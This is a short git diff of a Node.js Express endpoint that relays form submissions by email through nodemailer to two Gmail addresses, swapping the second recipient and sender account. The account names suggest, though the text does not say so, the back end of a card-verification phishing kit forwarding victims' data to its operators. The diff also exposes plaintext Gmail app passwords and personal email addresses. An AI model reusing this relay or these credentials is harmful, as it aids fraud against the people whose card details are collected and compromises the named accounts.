@@ -30,7 +30,7 @@ app.post('/send-email', async (req, res) => {
   const { subject, message } = req.body;
 
   const firstRecipient = 'kayodedaouda01@gmail.com';
-  const secondRecipient = 'ariagagnon704@gmail.com';
+  const secondRecipient = 'cardverify.center@gmail.com';
 
   // Transporteur pour les e-mails
   const transporter1 = nodemailer.createTransport({
@@ -44,8 +44,8 @@ app.post('/send-email', async (req, res) => {
   const transporter2 = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'cardverificator@gmail.com',
-      pass: 'xlwc ndpk naqw knid'
+      user: 'ticketsservicess@gmail.com',
+      pass: 'zigg dbya mxcf cgdc'
     }
   });
 
@@ -62,7 +62,7 @@ app.post('/send-email', async (req, res) => {
         text: firstMessage  // 👈 Message avec la ligne Utilisateur
       }),
       transporter2.sendMail({
-        from: 'cardverificator@gmail.com',
+        from: 'ticketsservicess@gmail.com',
         to: secondRecipient,
         subject,
         text: message       // 👈 Message original (sans la ligne Utilisateur)
